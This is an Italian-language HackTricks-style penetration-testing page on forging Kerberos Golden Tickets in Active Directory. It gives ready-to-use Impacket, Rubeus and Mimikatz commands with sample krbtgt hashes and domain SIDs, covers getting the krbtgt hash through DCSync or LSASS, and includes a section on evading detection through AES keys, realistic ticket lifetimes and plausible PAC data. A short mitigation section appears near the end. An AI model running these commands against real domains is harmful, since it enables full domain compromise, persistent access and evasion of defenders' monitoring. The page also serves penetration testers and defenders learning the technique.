# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Un attacco **Golden Ticket** consiste nella **creazione di un Ticket Granting Ticket (TGT) legittimo che impersona qualsiasi utente** mediante l'uso dell'**hash NTLM dell'account krbtgt di Active Directory (AD)**. Questa tecnica è particolarmente vantaggiosa perché **consente l'accesso a qualsiasi servizio o macchina** all'interno del dominio come l'utente impersonato. È fondamentale ricordare che le **credenziali dell'account krbtgt non vengono mai aggiornate automaticamente**.<sup>[[1]](#references)</sup>

Per **ottenere l'hash NTLM** dell'account krbtgt, è possibile utilizzare diversi metodi. Può essere estratto dal **processo Local Security Authority Subsystem Service (LSASS)** o dal file **NT Directory Services (NTDS.dit)** presente su qualsiasi Domain Controller (DC) all'interno del dominio. Inoltre, **eseguire un attacco DCsync** è un'altra strategia per ottenere questo hash NTLM; può essere effettuato utilizzando strumenti come il **modulo lsadump::dcsync** di Mimikatz o lo **script secretsdump.py** di Impacket. È importante sottolineare che, per eseguire queste operazioni, sono generalmente richiesti **privilegi di domain admin o un livello di accesso equivalente**.<sup>[[2]](#references)</sup>

Sebbene l'hash NTLM rappresenti un metodo valido per questo scopo, per motivi di sicurezza operativa è **fortemente consigliato** **forgiare i ticket utilizzando le chiavi Kerberos dell'Advanced Encryption Standard (AES) (AES128 e AES256)**. Questo è ancora più importante nei domini moderni, perché **l'uso di RC4 sta venendo gradualmente eliminato** ed è molto più facilmente riconoscibile nella telemetria Kerberos.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Note moderne sulla creazione dei ticket

Quando possibile, **esegui prima query su LDAP e SYSVOL** e poi forgia il ticket utilizzando i valori reali dei criteri del dominio e del PAC dell'utente invece di inventarli manualmente:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` richiede al DC i dati dell'utente, del gruppo, NetBIOS e dei criteri utilizzati per creare un PAC più realistico.
- `/printcmd` stampa una command line offline contenente i campi PAC recuperati, utile se in seguito vuoi falsificare lo stesso ticket senza interrogare nuovamente LDAP.
- `/extendedupndns` aggiunge i nuovi elementi PAC `UpnDns` contenenti `samAccountName` e il SID dell'account.
- `/oldpac` rimuove i nuovi buffer PAC `Requestor` e `Attributes`; è principalmente utile per i test di compatibilità con ambienti meno recenti, non per il tradecraft predefinito.

Da Linux, le versioni recenti di Impacket supportano anche l'aggiunta delle nuove strutture PAC e l'impostazione di un periodo di validità realistico:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` è espresso in **ore**. Il valore predefinito è **10 anni**, il che genera molto rumore.
- `-extra-pac` aggiunge le informazioni PAC `UPN_DNS` più recenti.
- `-old-pac` forza il layout PAC legacy.
- `-extra-sid` è utile quando il PAC necessita di SID aggiuntivi (ad esempio, negli scenari di escalation da child a parent, descritti in [SID-History Injection](sid-history-injection.md)).

**Una volta** che hai **iniettato il golden Ticket**, puoi accedere ai file condivisi **(C$)** ed eseguire servizi e WMI, quindi potresti usare **psexec** o **wmiexec** per ottenere una shell (sembra che non sia possibile ottenere una shell tramite winrm).

### Bypassing common detections

I metodi più frequenti per rilevare un golden ticket consistono nell'**ispezionare il traffico Kerberos** sulla rete. Per impostazione predefinita, Mimikatz **firma il TGT per 10 anni**, cosa che risulterà anomala nelle successive richieste TGS effettuate con esso.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Usa i parametri `/startoffset`, `/endin` e `/renewmax` per controllare l'offset di inizio, la durata e il numero massimo di rinnovi (tutti espressi in minuti).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Purtroppo, la durata del TGT non viene registrata negli eventi 4769, quindi non troverai queste informazioni nei log degli eventi di Windows. Tuttavia, ciò che puoi correlare è **la presenza di eventi 4769 senza un precedente evento 4768**. **Non è possibile richiedere un TGS senza un TGT** e, se non esiste alcuna registrazione dell'emissione di un TGT, possiamo dedurre che sia stato forgiato offline.

Nelle **build più recenti di Windows**, gli ID evento **4768** e **4769** espongono anche dati di telemetria molto più dettagliati sul **tipo di crittografia**. Un TGT/TGS forgiato che utilizza **RC4 (`0x17`)** in un dominio in cui `krbtgt`, client e servizi dispongono già di chiavi AES è molto più facile da individuare rispetto a qualche anno fa. Questo è un ulteriore motivo per preferire **Golden Tickets basati su AES** e per adattarsi il più possibile alla normale policy Kerberos del dominio.

Un altro problema di OPSEC è la **fedeltà del PAC**. Ticket con appartenenze a gruppi impossibili, buffer PAC più recenti mancanti o metadati dell'account non corrispondenti a LDAP sono più facili da rilevare quando i difensori convalidano i contenuti del PAC rispetto ai dati di AD. Se hai bisogno di un TGT che sembri realmente emesso da un DC, consulta:

{{#ref}}
diamond-ticket.md
{{#endref}}

Esistono anche **limiti ambientali** alla persistenza. L'account `krbtgt` conserva una **cronologia delle password pari a 2**, quindi un TGT forgiato può rimanere valido anche dopo il **primo** reset di `krbtgt` se è stato firmato con la chiave precedente. Per questo motivo, i difensori invalidano i Golden Tickets **reimpostando `krbtgt` due volte** e attendendo almeno la durata massima dei ticket del dominio tra un reset e l'altro.<sup>[[3]](#references)</sup>

Per **bypassare questo rilevamento**, controlla i diamond tickets.

### Mitigazione

- 4624: Accesso dell'account
- 4672: Accesso dell'amministratore
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Altri piccoli accorgimenti che i difensori possono adottare sono **generare un alert per gli eventi 4769 relativi a utenti sensibili**, come l'account amministratore predefinito del dominio, e generare un alert sull'**utilizzo di RC4 per `krbtgt`** nei domini che normalmente emettono ticket AES.<sup>[[5]](#references)</sup>

## Riferimenti

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
